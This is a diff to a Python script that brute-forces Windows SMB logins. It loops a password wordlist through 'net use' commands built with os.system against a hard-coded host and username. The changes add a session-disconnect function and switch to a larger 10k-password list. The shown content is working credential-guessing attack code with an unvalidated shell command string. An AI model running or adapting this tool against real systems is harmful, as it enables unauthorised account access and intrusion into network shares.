@@ -11,6 +11,10 @@ def connect_to_smb(ip, username, password):
     result = os.system(command)
     return result == 0
 
+def disconnect(ip):
+    command = f'net use \\\\{ip} /delete >nul 2>&1'
+    result = os.system(command)
+
 def read_passwords(file_path):
     with open(file_path, 'r') as file:
         passwords = file.readlines()
@@ -19,7 +23,7 @@ def read_passwords(file_path):
 def main():
     ip = '127.0.0.1'
     username = 'peyman'
-    password_file = './passwords/common.txt'
+    password_file = './passwords/10k.txt'
 
     passwords = read_passwords(password_file)
     total_passwords = len(passwords)
@@ -42,6 +46,8 @@ def main():
             pbar.update(1)
         else:
             print(f'\n{Fore.RED}Password not found{Style.RESET_ALL}')
+    
+    disconnect(ip)
 
 if __name__ == '__main__':
     main()
